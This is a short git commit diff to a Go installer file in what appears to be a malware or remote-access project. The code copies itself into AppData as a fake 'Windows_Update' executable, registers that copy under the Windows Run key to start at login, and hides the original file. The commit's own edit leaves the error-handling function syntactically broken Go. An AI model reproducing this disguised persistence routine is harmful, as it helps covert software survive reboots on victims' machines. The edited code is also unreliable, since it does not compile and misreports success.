c1143a637ddf9be1cc43489559a1f5a57fa47a23
Virgil <virgiltataru97@gmail.com>
2018-09-25 10:04:48 +0800

    refractor

--- src/installer.go
+++ src/installer.go
@@ -14,13 +14,16 @@ func Install() {
 		run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
 		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
 		run("attrib +H +S " + os.Args[0])
-	} 
+	}
 }
 
 func run(cmd string) {
 	c := exec.Command("cmd", "/C", cmd)
 
-    if err := c.Run(); err != nil {
+    if err := c.Run(); {
         fmt.Println("Error: ", err)
+    }
+    else{
+      fmt.Println("Success!")
     }
 }
